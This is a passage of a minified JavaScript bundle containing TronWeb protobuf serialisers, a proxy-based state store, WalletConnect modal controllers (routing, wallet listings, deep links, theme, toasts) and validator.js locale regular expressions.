            ,
            TronWebProto.CancelAllUnfreezeV2Contract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.CancelAllUnfreezeV2Contract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.CancelAllUnfreezeV2Contract.serializeBinaryToWriter = function(e, t) {
                var r;
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(1, r)
            }
            ,
            TronWebProto.CancelAllUnfreezeV2Contract.prototype.getOwnerAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.CancelAllUnfreezeV2Contract.prototype.getOwnerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOwnerAddress())
            }
            ,
            TronWebProto.CancelAllUnfreezeV2Contract.prototype.getOwnerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOwnerAddress())
            }
            ,
            TronWebProto.CancelAllUnfreezeV2Contract.prototype.setOwnerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            o.object.extend(t, TronWebProto)
        }
        ,
        7697: (e, t, r) => {
            "use strict";
            r.d(t, {
                mb: () => E,
                Ao: () => m,
                vZ: () => v,
                pV: () => j,
                D8: () => V,
                IN: () => T,
                jL: () => y,
                lH: () => Y,
                dC: () => X
            });
            Symbol();
            const n = Symbol();
            const o = Object.getPrototypeOf
              , i = new WeakMap
              , s = e => e && (i.has(e) ? i.get(e) : o(e) === Object.prototype || o(e) === Array.prototype)
              , a = function(e) {
                let t = !(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1];
                i.set(e, t)
            }
              , c = e => "object" === typeof e && null !== e
              , l = new WeakMap
              , u = new WeakSet
              , d = function() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : Object.is
                  , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : (e, t) => new Proxy(e,t)
                  , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : e => c(e) && !u.has(e) && (Array.isArray(e) || !(Symbol.iterator in e)) && !(e instanceof WeakMap) && !(e instanceof WeakSet) && !(e instanceof Error) && !(e instanceof Number) && !(e instanceof Date) && !(e instanceof String) && !(e instanceof RegExp) && !(e instanceof ArrayBuffer)
                  , o = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : e => {
                    switch (e.status) {
                    case "fulfilled":
                        return e.value;
                    case "rejected":
                        throw e.reason;
                    default:
                        throw e
                    }
                }
                  , i = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : new WeakMap
                  , d = arguments.length > 5 && void 0 !== arguments[5] ? arguments[5] : function(e, t) {
                    let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : o;
                    const n = i.get(e);
                    if ((null == n ? void 0 : n[0]) === t)
                        return n[1];
                    const s = Array.isArray(e) ? [] : Object.create(Object.getPrototypeOf(e));
                    return a(s, !0),
                    i.set(e, [t, s]),
                    Reflect.ownKeys(e).forEach((t => {
                        if (Object.getOwnPropertyDescriptor(s, t))
                            return;
                        const n = Reflect.get(e, t)
                          , o = {
                            value: n,
                            enumerable: !0,
                            configurable: !0
                        };
                        if (u.has(n))
                            a(n, !1);
                        else if (n instanceof Promise)
                            delete o.value,
                            o.get = () => r(n);
                        else if (l.has(n)) {
                            const [e,t] = l.get(n);
                            o.value = d(e, t(), r)
                        }
                        Object.defineProperty(s, t, o)
                    }
                    )),
                    Object.preventExtensions(s)
                }
                  , h = arguments.length > 6 && void 0 !== arguments[6] ? arguments[6] : new WeakMap
                  , f = arguments.length > 7 && void 0 !== arguments[7] ? arguments[7] : [1, 1]
                  , p = arguments.length > 8 && void 0 !== arguments[8] ? arguments[8] : o => {
                    if (!c(o))
                        throw new Error("object required");
                    const i = h.get(o);
                    if (i)
                        return i;
                    let a = f[0];
                    const g = new Set
                      , y = function(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : ++f[0];
                        a !== t && (a = t,
                        g.forEach((r => r(e, t))))
                    };
                    let m = f[1];
                    const b = e => (t, r) => {
                        const n = [...t];
                        n[1] = [e, ...n[1]],
                        y(n, r)
                    }
                      , v = new Map
                      , w = e => {
                        var t;
                        const r = v.get(e);
                        r && (v.delete(e),
                        null == (t = r[1]) || t.call(r))
                    }
                      , T = Array.isArray(o) ? [] : Object.create(Object.getPrototypeOf(o))
                      , A = {
                        deleteProperty(e, t) {
                            const r = Reflect.get(e, t);
                            w(t);
                            const n = Reflect.deleteProperty(e, t);
                            return n && y(["delete", [t], r]),
                            n
                        },
                        set(t, o, i, a) {
                            const d = Reflect.has(t, o)
                              , f = Reflect.get(t, o, a);
                            if (d && (e(f, i) || h.has(i) && e(f, h.get(i))))
                                return !0;
                            w(o),
                            c(i) && (i = (e => s(e) && e[n] || null)(i) || i);
                            let m = i;
                            if (i instanceof Promise)
                                i.then((e => {
                                    i.status = "fulfilled",
                                    i.value = e,
                                    y(["resolve", [o], e])
                                }
                                )).catch((e => {
                                    i.status = "rejected",
                                    i.reason = e,
                                    y(["reject", [o], e])
                                }
                                ));
                            else {
                                !l.has(i) && r(i) && (m = p(i));
                                const e = !u.has(m) && l.get(m);
                                e && ( (e, t) => {
                                    if (v.has(e))
                                        throw new Error("prop listener already exists");
                                    if (g.size) {
                                        const r = t[3](b(e));
                                        v.set(e, [t, r])
                                    } else
                                        v.set(e, [t])
                                }
                                )(o, e)
                            }
                            return Reflect.set(t, o, m, a),
                            y(["set", [o], i, f]),
                            !0
                        }
                    }
                      , E = t(T, A);
                    h.set(o, E);
                    const P = [T, function() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : ++f[1];
                        return m === e || g.size || (m = e,
                        v.forEach((t => {
                            let[r] = t;
                            const n = r[1](e);
                            n > a && (a = n)
                        }
                        ))),
                        a
                    }
                    , d, e => {
                        g.add(e),
                        1 === g.size && v.forEach(( (e, t) => {
                            let[r,n] = e;
                            if (n)
                                throw new Error("remove already exists");
                            const o = r[3](b(t));
                            v.set(t, [r, o])
                        }
                        ));
                        return () => {
                            g.delete(e),
                            0 === g.size && v.forEach(( (e, t) => {
                                let[r,n] = e;
                                n && (n(),
                                v.set(t, [r]))
                            }
                            ))
                        }
                    }
                    ];
                    return l.set(E, P),
                    Reflect.ownKeys(o).forEach((e => {
                        const t = Object.getOwnPropertyDescriptor(o, e);
                        "value"in t && (E[e] = o[e],
                        delete t.value,
                        delete t.writable),
                        Object.defineProperty(T, e, t)
                    }
                    )),
                    E
                }
                ;
                return [p, l, u, e, t, r, o, i, d, h, f]
            }
              , [h] = d();
            function f() {
                return h(arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {})
            }
            function p(e, t, r) {
                const n = l.get(e);
                let o;
                n || console.warn("Please use proxy object");
                const i = []
                  , s = n[3];
                let a = !1;
                const c = s((e => {
                    i.push(e),
                    r ? t(i.splice(0)) : o || (o = Promise.resolve().then(( () => {
                        o = void 0,
                        a && t(i.splice(0))
                    }
                    )))
                }
                ));
                return a = !0,
                () => {
                    a = !1,
                    c()
                }
            }
            const g = f({
                history: ["ConnectWallet"],
                view: "ConnectWallet",
                data: void 0
            })
              , y = {
                state: g,
                subscribe: e => p(g, ( () => e(g))),
                push(e, t) {
                    e !== g.view && (g.view = e,
                    t && (g.data = t),
                    g.history.push(e))
                },
                reset(e) {
                    g.view = e,
                    g.history = [e]
                },
                replace(e) {
                    g.history.length > 1 && (g.history[g.history.length - 1] = e,
                    g.view = e)
                },
                goBack() {
                    if (g.history.length > 1) {
                        g.history.pop();
                        const [e] = g.history.slice(-1);
                        g.view = e
                    }
                },
                setData(e) {
                    g.data = e
                }
            }
              , m = {
                WALLETCONNECT_DEEPLINK_CHOICE: "WALLETCONNECT_DEEPLINK_CHOICE",
                WCM_VERSION: "WCM_VERSION",
                RECOMMENDED_WALLET_AMOUNT: 9,
                isMobile: () => "undefined" !== typeof window && Boolean(window.matchMedia("(pointer:coarse)").matches || /Android|webOS|iPhone|iPad|iPod|BlackBerry|Opera Mini/.test(navigator.userAgent)),
                isAndroid: () => m.isMobile() && navigator.userAgent.toLowerCase().includes("android"),
                isIos() {
                    const e = navigator.userAgent.toLowerCase();
                    return m.isMobile() && (e.includes("iphone") || e.includes("ipad"))
                },
                isHttpUrl: e => e.startsWith("http://") || e.startsWith("https://"),
                isArray: e => Array.isArray(e) && e.length > 0,
                isTelegram: () => "undefined" !== typeof window && (Boolean(window.TelegramWebviewProxy) || Boolean(window.Telegram) || Boolean(window.TelegramWebviewProxyProto)),
                formatNativeUrl(e, t, r) {
                    if (m.isHttpUrl(e))
                        return this.formatUniversalUrl(e, t, r);
                    let n = e;
                    n.includes("://") || (n = e.replaceAll("/", "").replaceAll(":", ""),
                    n = "".concat(n, "://")),
                    n.endsWith("/") || (n = "".concat(n, "/")),
                    this.setWalletConnectDeepLink(n, r);
                    const o = encodeURIComponent(t);
                    return "".concat(n, "wc?uri=").concat(o)
                },
                formatUniversalUrl(e, t, r) {
                    if (!m.isHttpUrl(e))
                        return this.formatNativeUrl(e, t, r);
                    let n = e;
                    if (n.startsWith("https://t.me")) {
                        const e = Buffer.from(t).toString("base64").replace(/[=]/g, "");
                        n.endsWith("/") && (n = n.slice(0, -1)),
                        this.setWalletConnectDeepLink(n, r);
                        const o = new URL(n);
                        o.searchParams.set("startapp", e);
                        return o.toString()
                    }
                    n.endsWith("/") || (n = "".concat(n, "/")),
                    this.setWalletConnectDeepLink(n, r);
                    const o = encodeURIComponent(t);
                    return "".concat(n, "wc?uri=").concat(o)
                },
                wait: async e => new Promise((t => {
                    setTimeout(t, e)
                }
                )),
                openHref(e, t) {
                    const r = this.isTelegram() ? "_blank" : t;
                    window.open(e, r, "noreferrer noopener")
                },
                setWalletConnectDeepLink(e, t) {
                    try {
                        localStorage.setItem(m.WALLETCONNECT_DEEPLINK_CHOICE, JSON.stringify({
                            href: e,
                            name: t
                        }))
                    } catch (r) {
                        console.info("Unable to set WalletConnect deep link")
                    }
                },
                setWalletConnectAndroidDeepLink(e) {
                    try {
                        const [t] = e.split("?");
                        localStorage.setItem(m.WALLETCONNECT_DEEPLINK_CHOICE, JSON.stringify({
                            href: t,
                            name: "Android"
                        }))
                    } catch (t) {
                        console.info("Unable to set WalletConnect android deep link")
                    }
                },
                removeWalletConnectDeepLink() {
                    try {
                        localStorage.removeItem(m.WALLETCONNECT_DEEPLINK_CHOICE)
                    } catch (e) {
                        console.info("Unable to remove WalletConnect deep link")
                    }
                },
                setModalVersionInStorage() {
                    try {
                        "undefined" !== typeof localStorage && localStorage.setItem(m.WCM_VERSION, "2.7.0")
                    } catch (e) {
                        console.info("Unable to set Web3Modal version in storage")
                    }
                },
                getWalletRouterData() {
                    var e;
                    const t = null == (e = y.state.data) ? void 0 : e.Wallet;
                    if (!t)
                        throw new Error('Missing "Wallet" view data');
                    return t
                }
            }
              , b = f({
                enabled: "undefined" !== typeof location && (location.hostname.includes("localhost") || location.protocol.includes("https")),
                userSessionId: "",
                events: [],
                connectedWalletId: void 0
            })
              , v = {
                state: b,
                subscribe: e => p(b.events, ( () => e(function(e, t) {
                    const r = l.get(e);
                    r || console.warn("Please use proxy object");
                    const [n,o,i] = r;
                    return i(n, o(), t)
                }(b.events[b.events.length - 1])))),
                initialize() {
                    b.enabled && "undefined" !== typeof (null == crypto ? void 0 : crypto.randomUUID) && (b.userSessionId = crypto.randomUUID())
                },
                setConnectedWalletId(e) {
                    b.connectedWalletId = e
                },
                click(e) {
                    if (b.enabled) {
                        const t = {
                            type: "CLICK",
                            name: e.name,
                            userSessionId: b.userSessionId,
                            timestamp: Date.now(),
                            data: e
                        };
                        b.events.push(t)
                    }
                },
                track(e) {
                    if (b.enabled) {
                        const t = {
                            type: "TRACK",
                            name: e.name,
                            userSessionId: b.userSessionId,
                            timestamp: Date.now(),
                            data: e
                        };
                        b.events.push(t)
                    }
                },
                view(e) {
                    if (b.enabled) {
                        const t = {
                            type: "VIEW",
                            name: e.name,
                            userSessionId: b.userSessionId,
                            timestamp: Date.now(),
                            data: e
                        };
                        b.events.push(t)
                    }
                }
            }
              , w = f({
                chains: void 0,
                walletConnectUri: void 0,
                isAuth: !1,
                isCustomDesktop: !1,
                isCustomMobile: !1,
                isDataLoaded: !1,
                isUiLoaded: !1
            })
              , T = {
                state: w,
                subscribe: e => p(w, ( () => e(w))),
                setChains(e) {
                    w.chains = e
                },
                setWalletConnectUri(e) {
                    w.walletConnectUri = e
                },
                setIsCustomDesktop(e) {
                    w.isCustomDesktop = e
                },
                setIsCustomMobile(e) {
                    w.isCustomMobile = e
                },
                setIsDataLoaded(e) {
                    w.isDataLoaded = e
                },
                setIsUiLoaded(e) {
                    w.isUiLoaded = e
                },
                setIsAuth(e) {
                    w.isAuth = e
                }
            }
              , A = f({
                projectId: "",
                mobileWallets: void 0,
                desktopWallets: void 0,
                walletImages: void 0,
                chains: void 0,
                enableAuthMode: !1,
                enableExplorer: !0,
                explorerExcludedWalletIds: void 0,
                explorerRecommendedWalletIds: void 0,
                termsOfServiceUrl: void 0,
                privacyPolicyUrl: void 0
            })
              , E = {
                state: A,
                subscribe: e => p(A, ( () => e(A))),
                setConfig(e) {
                    var t, r;
                    v.initialize(),
                    T.setChains(e.chains),
                    T.setIsAuth(Boolean(e.enableAuthMode)),
                    T.setIsCustomMobile(Boolean(null == (t = e.mobileWallets) ? void 0 : t.length)),
                    T.setIsCustomDesktop(Boolean(null == (r = e.desktopWallets) ? void 0 : r.length)),
                    m.setModalVersionInStorage(),
                    Object.assign(A, e)
                }
            };
            var P = Object.defineProperty
              , C = Object.getOwnPropertySymbols
              , S = Object.prototype.hasOwnProperty
              , I = Object.prototype.propertyIsEnumerable
              , B = (e, t, r) => t in e ? P(e, t, {
                enumerable: !0,
                configurable: !0,
                writable: !0,
                value: r
            }) : e[t] = r;
            const x = "https://explorer-api.walletconnect.com"
              , O = "wcm"
              , _ = "js-".concat("2.7.0");
            async function W(e, t) {
                const r = ( (e, t) => {
                    for (var r in t || (t = {}))
                        S.call(t, r) && B(e, r, t[r]);
                    if (C)
                        for (var r of C(t))
                            I.call(t, r) && B(e, r, t[r]);
                    return e
                }
                )({
                    sdkType: O,
                    sdkVersion: _
                }, t)
                  , n = new URL(e,x);
                n.searchParams.append("projectId", E.state.projectId),
                Object.entries(r).forEach((e => {
                    let[t,r] = e;
                    r && n.searchParams.append(t, String(r))
                }
                ));
                return (await fetch(n)).json()
            }
            const R = {
                getDesktopListings: async e => W("/w3m/v1/getDesktopListings", e),
                getMobileListings: async e => W("/w3m/v1/getMobileListings", e),
                getInjectedListings: async e => W("/w3m/v1/getInjectedListings", e),
                getAllListings: async e => W("/w3m/v1/getAllListings", e),
                getWalletImageUrl: e => "".concat(x, "/w3m/v1/getWalletImage/").concat(e, "?projectId=").concat(E.state.projectId, "&sdkType=").concat(O, "&sdkVersion=").concat(_),
                getAssetImageUrl: e => "".concat(x, "/w3m/v1/getAssetImage/").concat(e, "?projectId=").concat(E.state.projectId, "&sdkType=").concat(O, "&sdkVersion=").concat(_)
            };
            var k = Object.defineProperty
              , M = Object.getOwnPropertySymbols
              , N = Object.prototype.hasOwnProperty
              , F = Object.prototype.propertyIsEnumerable
              , U = (e, t, r) => t in e ? k(e, t, {
                enumerable: !0,
                configurable: !0,
                writable: !0,
                value: r
            }) : e[t] = r;
            const D = m.isMobile()
              , L = f({
                wallets: {
                    listings: [],
                    total: 0,
                    page: 1
                },
                search: {
                    listings: [],
                    total: 0,
                    page: 1
                },
                recomendedWallets: []
            })
              , j = {
                state: L,
                async getRecomendedWallets() {
                    const {explorerRecommendedWalletIds: e, explorerExcludedWalletIds: t} = E.state;
                    if ("NONE" === e || "ALL" === t && !e)
                        return L.recomendedWallets;
                    if (m.isArray(e)) {
                        const t = {
                            recommendedIds: e.join(",")
                        }
                          , {listings: r} = await R.getAllListings(t)
                          , n = Object.values(r);
                        n.sort(( (t, r) => e.indexOf(t.id) - e.indexOf(r.id))),
                        L.recomendedWallets = n
                    } else {
                        const {chains: e, isAuth: r} = T.state
                          , n = null == e ? void 0 : e.join(",")
                          , o = m.isArray(t)
                          , i = {
                            page: 1,
                            sdks: r ? "auth_v1" : void 0,
                            entries: m.RECOMMENDED_WALLET_AMOUNT,
                            chains: n,
                            version: 2,
                            excludedIds: o ? t.join(",") : void 0
                        }
                          , {listings: s} = D ? await R.getMobileListings(i) : await R.getDesktopListings(i);
                        L.recomendedWallets = Object.values(s)
                    }
                    return L.recomendedWallets
                },
                async getWallets(e) {
                    const t = ( (e, t) => {
                        for (var r in t || (t = {}))
                            N.call(t, r) && U(e, r, t[r]);
                        if (M)
                            for (var r of M(t))
                                F.call(t, r) && U(e, r, t[r]);
                        return e
                    }
                    )({}, e)
                      , {explorerRecommendedWalletIds: r, explorerExcludedWalletIds: n} = E.state
                      , {recomendedWallets: o} = L;
                    if ("ALL" === n)
                        return L.wallets;
                    o.length ? t.excludedIds = o.map((e => e.id)).join(",") : m.isArray(r) && (t.excludedIds = r.join(",")),
                    m.isArray(n) && (t.excludedIds = [t.excludedIds, n].filter(Boolean).join(",")),
                    T.state.isAuth && (t.sdks = "auth_v1");
                    const {page: i, search: s} = e
                      , {listings: a, total: c} = D ? await R.getMobileListings(t) : await R.getDesktopListings(t)
                      , l = Object.values(a)
                      , u = s ? "search" : "wallets";
                    return L[u] = {
                        listings: [...L[u].listings, ...l],
                        total: c,
                        page: null != i ? i : 1
                    },
                    {
                        listings: l,
                        total: c
                    }
                },
                getWalletImageUrl: e => R.getWalletImageUrl(e),
                getAssetImageUrl: e => R.getAssetImageUrl(e),
                resetSearch() {
                    L.search = {
                        listings: [],
                        total: 0,
                        page: 1
                    }
                }
            }
              , z = f({
                open: !1
            })
              , V = {
                state: z,
                subscribe: e => p(z, ( () => e(z))),
                open: async e => new Promise((t => {
                    const {isUiLoaded: r, isDataLoaded: n} = T.state;
                    if (m.removeWalletConnectDeepLink(),
                    T.setWalletConnectUri(null == e ? void 0 : e.uri),
                    T.setChains(null == e ? void 0 : e.chains),
                    y.reset("ConnectWallet"),
                    r && n)
                        z.open = !0,
                        t();
                    else {
                        const e = setInterval(( () => {
                            const r = T.state;
                            r.isUiLoaded && r.isDataLoaded && (clearInterval(e),
                            z.open = !0,
                            t())
                        }
                        ), 200)
                    }
                }
                )),
                close() {
                    z.open = !1
                }
            };
            var H = Object.defineProperty
              , q = Object.getOwnPropertySymbols
              , G = Object.prototype.hasOwnProperty
              , $ = Object.prototype.propertyIsEnumerable
              , K = (e, t, r) => t in e ? H(e, t, {
                enumerable: !0,
                configurable: !0,
                writable: !0,
                value: r
            }) : e[t] = r;
            const Z = f({
                themeMode: "undefined" !== typeof matchMedia && matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light"
            })
              , Y = {
                state: Z,
                subscribe: e => p(Z, ( () => e(Z))),
                setThemeConfig(e) {
                    const {themeMode: t, themeVariables: r} = e;
                    t && (Z.themeMode = t),
                    r && (Z.themeVariables = ( (e, t) => {
                        for (var r in t || (t = {}))
                            G.call(t, r) && K(e, r, t[r]);
                        if (q)
                            for (var r of q(t))
                                $.call(t, r) && K(e, r, t[r]);
                        return e
                    }
                    )({}, r))
                }
            }
              , J = f({
                open: !1,
                message: "",
                variant: "success"
            })
              , X = {
                state: J,
                subscribe: e => p(J, ( () => e(J))),
                openToast(e, t) {
                    J.open = !0,
                    J.message = e,
                    J.variant = t
                },
                closeToast() {
                    J.open = !1
                }
            }
        }
        ,
        7805: (e, t, r) => {
            const n = r(77);
            e.exports = (e, t) => new n(e,t).set.map((e => e.map((e => e.value)).join(" ").trim().split(" ")))
        }
        ,
        7807: (e, t, r) => {
            const n = r(2282);
            e.exports = (e, t) => {
                const r = n(e, t);
                return r ? r.version : null
            }
        }
        ,
        7858: (e, t) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.farsiLocales = t.englishLocales = t.dotDecimal = t.decimal = t.commaDecimal = t.bengaliLocales = t.arabicLocales = t.alphanumeric = t.alpha = void 0;
            for (var r, n = t.alpha = {
                "en-US": /^[A-Z]+$/i,
                "az-AZ": /^[A-VXYZ\xc7\u018f\u011e\u0130\u0131\xd6\u015e\xdc]+$/i,
                "bg-BG": /^[\u0410-\u042f]+$/i,
                "cs-CZ": /^[A-Z\xc1\u010c\u010e\xc9\u011a\xcd\u0147\xd3\u0158\u0160\u0164\xda\u016e\xdd\u017d]+$/i,
                "da-DK": /^[A-Z\xc6\xd8\xc5]+$/i,
                "de-DE": /^[A-Z\xc4\xd6\xdc\xdf]+$/i,
                "el-GR": /^[\u0391-\u03ce]+$/i,
                "es-ES": /^[A-Z\xc1\xc9\xcd\xd1\xd3\xda\xdc]+$/i,
                "fa-IR": /^[\u0627\u0628\u067e\u062a\u062b\u062c\u0686\u062d\u062e\u062f\u0630\u0631\u0632\u0698\u0633\u0634\u0635\u0636\u0637\u0638\u0639\u063a\u0641\u0642\u06a9\u06af\u0644\u0645\u0646\u0648\u0647\u06cc]+$/i,
                "fi-FI": /^[A-Z\xc5\xc4\xd6]+$/i,
                "fr-FR": /^[A-Z\xc0\xc2\xc6\xc7\xc9\xc8\xca\xcb\xcf\xce\xd4\u0152\xd9\xdb\xdc\u0178]+$/i,
                "it-IT": /^[A-Z\xc0\xc9\xc8\xcc\xce\xd3\xd2\xd9]+$/i,
                "ja-JP": /^[\u3041-\u3093\u30a1-\u30f6\uff66-\uff9f\u4e00-\u9fa0\u30fc\u30fb\u3002\u3001]+$/i,
                "nb-NO": /^[A-Z\xc6\xd8\xc5]+$/i,
                "nl-NL": /^[A-Z\xc1\xc9\xcb\xcf\xd3\xd6\xdc\xda]+$/i,
                "nn-NO": /^[A-Z\xc6\xd8\xc5]+$/i,
                "hu-HU": /^[A-Z\xc1\xc9\xcd\xd3\xd6\u0150\xda\xdc\u0170]+$/i,
                "pl-PL": /^[A-Z\u0104\u0106\u0118\u015a\u0141\u0143\xd3\u017b\u0179]+$/i,
                "pt-PT": /^[A-Z\xc3\xc1\xc0\xc2\xc4\xc7\xc9\xca\xcb\xcd\xcf\xd5\xd3\xd4\xd6\xda\xdc]+$/i,
                "ru-RU": /^[\u0410-\u042f\u0401]+$/i,
                "kk-KZ": /^[\u0410-\u042f\u0401\u04D8\u04B0\u0406\u04A2\u0492\u04AE\u049A\u04E8\u04BA]+$/i,
                "sl-SI": /^[A-Z\u010c\u0106\u0110\u0160\u017d]+$/i,
                "sk-SK": /^[A-Z\xc1\u010c\u010e\xc9\xcd\u0147\xd3\u0160\u0164\xda\xdd\u017d\u0139\u0154\u013d\xc4\xd4]+$/i,
                "sr-RS@latin": /^[A-Z\u010c\u0106\u017d\u0160\u0110]+$/i,
                "sr-RS": /^[\u0410-\u042f\u0402\u0408\u0409\u040a\u040b\u040f]+$/i,
                "sv-SE": /^[A-Z\xc5\xc4\xd6]+$/i,
                "th-TH": /^[\u0e01-\u0e50\s]+$/i,
                "tr-TR": /^[A-Z\xc7\u011e\u0130\u0131\xd6\u015e\xdc]+$/i,
                "uk-UA": /^[\u0410-\u0429\u042c\u042e\u042f\u0404I\u0407\u0490\u0456]+$/i,
                "vi-VN": /^[A-Z\xc0\xc1\u1ea0\u1ea2\xc3\xc2\u1ea6\u1ea4\u1eac\u1ea8\u1eaa\u0102\u1eb0\u1eae\u1eb6\u1eb2\u1eb4\u0110\xc8\xc9\u1eb8\u1eba\u1ebc\xca\u1ec0\u1ebe\u1ec6\u1ec2\u1ec4\xcc\xcd\u1eca\u1ec8\u0128\xd2\xd3\u1ecc\u1ece\xd5\xd4\u1ed2\u1ed0\u1ed8\u1ed4\u1ed6\u01a0\u1edc\u1eda\u1ee2\u1ede\u1ee0\xd9\xda\u1ee4\u1ee6\u0168\u01af\u1eea\u1ee8\u1ef0\u1eec\u1eee\u1ef2\xdd\u1ef4\u1ef6\u1ef8]+$/i,
                "ko-KR": /^[\u3131-\u314e\u314f-\u3163\uac00-\ud7a3]*$/,
                "ku-IQ": /^[\u0626\u0627\u0628\u067e\u062a\u062c\u0686\u062d\u062e\u062f\u0631\u0695\u0632\u0698\u0633\u0634\u0639\u063a\u0641\u06a4\u0642\u06a9\u06af\u0644\u06b5\u0645\u0646\u0648\u06c6\u06be\u06d5\u06cc\u06ce\u064a\u0637\u0624\u062b\u0622\u0625\u0623\u0643\u0636\u0635\u0629\u0638\u0630]+$/i,
                ar: /^[\u0621\u0622\u0623\u0624\u0625\u0626\u0627\u0628\u0629\u062a\u062b\u062c\u062d\u062e\u062f\u0630\u0631\u0632\u0633\u0634\u0635\u0636\u0637\u0638\u0639\u063a\u0641\u0642\u0643\u0644\u0645\u0646\u0647\u0648\u0649\u064a\u064b\u064c\u064d\u064e\u064f\u0650\u0651\u0652\u0670]+$/,
                he: /^[\u05d0-\u05ea]+$/,
                fa: /^['\u0622\u0627\u0621\u0623\u0624\u0626\u0628\u067e\u062a\u062b\u062c\u0686\u062d\u062e\u062f\u0630\u0631\u0632\u0698\u0633\u0634\u0635\u0636\u0637\u0638\u0639\u063a\u0641\u0642\u06a9\u06af\u0644\u0645\u0646\u0648\u0647\u0629\u06cc']+$/i,
                bn: /^['\u0980\u0981\u0982\u0983\u0985\u0986\u0987\u0988\u0989\u098a\u098b\u098c\u098f\u0990\u0993\u0994\u0995\u0996\u0997\u0998\u0999\u099a\u099b\u099c\u099d\u099e\u099f\u09a0\u09a1\u09a2\u09a3\u09a4\u09a5\u09a6\u09a7\u09a8\u09aa\u09ab\u09ac\u09ad\u09ae\u09af\u09b0\u09b2\u09b6\u09b7\u09b8\u09b9\u09bc\u09bd\u09be\u09bf\u09c0\u09c1\u09c2\u09c3\u09c4\u09c7\u09c8\u09cb\u09cc\u09cd\u09ce\u09d7\u09dc\u09dd\u09df\u09e0\u09e1\u09e2\u09e3\u09f0\u09f1\u09f2\u09f3\u09f4\u09f5\u09f6\u09f7\u09f8\u09f9\u09fa\u09fb']+$/,
                eo: /^[ABC\u0108D-G\u011cH\u0124IJ\u0134K-PRS\u015cTU\u016cVZ]+$/i,
                "hi-IN": /^[\u0900-\u0961]+[\u0972-\u097F]*$/i,
                "si-LK": /^[\u0D80-\u0DFF]+$/
            }, o = t.alphanumeric = {
                "en-US": /^[0-9A-Z]+$/i,
                "az-AZ": /^[0-9A-VXYZ\xc7\u018f\u011e\u0130\u0131\xd6\u015e\xdc]+$/i,
                "bg-BG": /^[0-9\u0410-\u042f]+$/i,
                "cs-CZ": /^[0-9A-Z\xc1\u010c\u010e\xc9\u011a\xcd\u0147\xd3\u0158\u0160\u0164\xda\u016e\xdd\u017d]+$/i,
                "da-DK": /^[0-9A-Z\xc6\xd8\xc5]+$/i,
                "de-DE": /^[0-9A-Z\xc4\xd6\xdc\xdf]+$/i,
                "el-GR": /^[0-9\u0391-\u03c9]+$/i,
                "es-ES": /^[0-9A-Z\xc1\xc9\xcd\xd1\xd3\xda\xdc]+$/i,
                "fi-FI": /^[0-9A-Z\xc5\xc4\xd6]+$/i,
                "fr-FR": /^[0-9A-Z\xc0\xc2\xc6\xc7\xc9\xc8\xca\xcb\xcf\xce\xd4\u0152\xd9\xdb\xdc\u0178]+$/i,
                "it-IT": /^[0-9A-Z\xc0\xc9\xc8\xcc\xce\xd3\xd2\xd9]+$/i,
                "ja-JP": /^[0-9\uff10-\uff19\u3041-\u3093\u30a1-\u30f6\uff66-\uff9f\u4e00-\u9fa0\u30fc\u30fb\u3002\u3001]+$/i,
                "hu-HU": /^[0-9A-Z\xc1\xc9\xcd\xd3\xd6\u0150\xda\xdc\u0170]+$/i,
                "nb-NO": /^[0-9A-Z\xc6\xd8\xc5]+$/i,
                "nl-NL": /^[0-9A-Z\xc1\xc9\xcb\xcf\xd3\xd6\xdc\xda]+$/i,
                "nn-NO": /^[0-9A-Z\xc6\xd8\xc5]+$/i,
                "pl-PL": /^[0-9A-Z\u0104\u0106\u0118\u015a\u0141\u0143\xd3\u017b\u0179]+$/i,
                "pt-PT": /^[0-9A-Z\xc3\xc1\xc0\xc2\xc4\xc7\xc9\xca\xcb\xcd\xcf\xd5\xd3\xd4\xd6\xda\xdc]+$/i,
                "ru-RU": /^[0-9\u0410-\u042f\u0401]+$/i,
                "kk-KZ": /^[0-9\u0410-\u042f\u0401\u04D8\u04B0\u0406\u04A2\u0492\u04AE\u049A\u04E8\u04BA]+$/i,
                "sl-SI": /^[0-9A-Z\u010c\u0106\u0110\u0160\u017d]+$/i,
                "sk-SK": /^[0-9A-Z\xc1\u010c\u010e\xc9\xcd\u0147\xd3\u0160\u0164\xda\xdd\u017d\u0139\u0154\u013d\xc4\xd4]+$/i,
                "sr-RS@latin": /^[0-9A-Z\u010c\u0106\u017d\u0160\u0110]+$/i,
                "sr-RS": /^[0-9\u0410-\u042f\u0402\u0408\u0409\u040a\u040b\u040f]+$/i,
                "sv-SE": /^[0-9A-Z\xc5\xc4\xd6]+$/i,
                "th-TH": /^[\u0e01-\u0e59\s]+$/i,
                "tr-TR": /^[0-9A-Z\xc7\u011e\u0130\u0131\xd6\u015e\xdc]+$/i,
                "uk-UA": /^[0-9\u0410-\u0429\u042c\u042e\u042f\u0404I\u0407\u0490\u0456]+$/i,
                "ko-KR": /^[0-9\u3131-\u314e\u314f-\u3163\uac00-\ud7a3]*$/,
